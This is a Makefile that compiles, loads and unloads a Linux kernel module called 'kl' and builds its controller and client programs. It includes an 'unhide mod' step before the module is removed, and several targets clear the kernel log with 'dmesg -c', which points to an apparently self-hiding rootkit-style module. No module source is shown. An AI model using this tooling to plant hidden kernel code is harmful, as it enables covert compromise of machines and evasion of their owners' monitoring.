obj-m += kl.o
ccflags-y :=

all:
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
	gcc -g -o kl-controller ./kl-controller.c
	gcc -g -o kl-client ./kl-client.c

reload:
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
	gcc -g -o kl-controller ./kl-controller.c
	gcc -g -o kl-client ./kl-client.c
	
	./kl-controller unhide mod
	sudo rmmod -f kl
	sudo dmesg -c > /dev/null
	sudo insmod kl.ko

load:
	sudo dmesg -c > /dev/null
	sudo insmod kl.ko

unload:
	./kl-controller unhide mod
	sudo rmmod -f kl

clean:
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
	rm -rf *.ur-safe
	rm kl-controller kl-client

.PHONY: compile_commands
compile_commands:
	compiledb make
